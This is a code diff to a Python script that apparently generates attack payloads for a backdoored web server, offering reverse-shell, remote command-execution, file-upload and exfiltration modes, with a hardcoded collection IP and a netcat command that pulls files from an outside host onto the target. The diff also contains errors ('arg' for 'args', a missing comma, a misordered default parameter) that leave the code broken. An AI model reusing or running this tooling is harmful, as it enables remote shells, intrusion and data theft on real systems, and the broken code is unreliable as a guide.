@@ -5,6 +5,8 @@ def main():
 
     #Required arguments
     parser.add_argument('-p', type=str, default=None, help='Desired Payload: exfil', dest='payloadChoice', required=True)
+    parser.add_argument('-t', type=str, default=None, help='Target Server', dest='targetServer', required=True)
+    parser.add_argument('-v', type=str, default=None, help='Server Variables', dest='variables', required=True)
     parser.add_argument('-i', type=str, default="131.151.162.100", help='collection ip address', dest='collectionIP', required=False)
     parser.add_argument('-r', type=str, default=1234, help='collection port', dest='collectionPort', required=False)
     parser.add_argument('-u', type=str, default="input", help='File you wish to exfil', dest='uploadFile', required=False)
@@ -16,26 +18,23 @@ def main():
     #Reverse Shell Payload
     if(args.payloadChoice == "RShell"):
         print("Reverse Shell payload generator.")
-        variables = "pass=abc321&payload="
-        ReverseShell(args.collectionIP, args.collectionPort, variables)
+        ReverseShell(args.collectionIP, args.collectionPort, arg.variables, arg.targetServer)
 
     #Command Execution Payload
     #Create an upload script to upload a sh file, and then after about a minute you can run the CExe file.
     if(args.payloadChoice == "CExe"):
-        variables = "pass=abc321&payload="
         fileName = args.uploadFile
         if(len(args.uploadFile.split('/')[:-1]) > 0):
             fileName = fileName.split('/')[-1]
-        GenCommandExecution(fileName, variables, args.collectionIP, args.collectionPort)
+        GenCommandExecution(fileName, arg.variables, args.collectionIP, args.collectionPort, arg.targetServer)
         print("Execute")
 
     #File-upload Payload
     if(args.payloadChoice == "Upload"):
-        variables = "pass=abc321&payload="
         fileName = args.uploadFile
         if(len(args.uploadFile.split('/')[:-1]) > 0):
             fileName = fileName.split('/')[-1]
-        GenFileUpload(args.uploadFile, fileName, variables, args.collectionIP, args.collectionPort)
+        GenFileUpload(args.uploadFile, fileName, arg.variables, args.collectionIP, args.collectionPort, arg.targetServer)
         print("Upload")
 
     #File-download Payload
@@ -50,24 +49,23 @@ def main():
 
     return
 
-def ReverseShell(collectionIP, collectionPort, variables):
-    variables = "pass=abc321&payload="
+def ReverseShell(collectionIP, collectionPort, variables, targetServer):
     GenFileUpload("UsefulBash/ReverseShell.sh", "ReverseShell.sh", variables, collectionIP, collectionPort)
     GenCommandExecution("ReverseShell.sh", variables, collectionIP, collectionPort)
     return
 
-def GenCommandExecution(uploadFile, variables, collectionIP, collectionPort):
+def GenCommandExecution(uploadFile, variables, collectionIP, collectionPort, targetServer):
     with open('CMDTemplates/CExe', 'r') as file:
-        ExecutionPayloadText = file.read().format(variables, uploadFile)
+        ExecutionPayloadText = file.read().format(variables, uploadFile, targetServer)
     f = open("CExe.cmd", "w")
     f.write(ExecutionPayloadText)
     f.close()
     return
 
-def GenFileUpload(uploadFileDirectory, uploadFile, variables, collectionIP, collectionPort, commandFileName="Upload.cmd"):
+def GenFileUpload(uploadFileDirectory, uploadFile, variables, collectionIP, collectionPort, commandFileName="Upload.cmd", targetServer):
     uploadcmd = "nc -q 5 {0} {1} > {2}".format(collectionIP, collectionPort, uploadFile).replace(' ', "%%20")
     with open('CMDTemplates/Upload', 'r') as file:
-        UploadPayloadText = file.read().format(collectionPort, uploadFileDirectory, variables, uploadcmd, uploadFile)
+        UploadPayloadText = file.read().format(collectionPort, uploadFileDirectory, variables, uploadcmd, targetServer uploadFile)
 
     f = open(commandFileName, "w")
     f.write(UploadPayloadText)
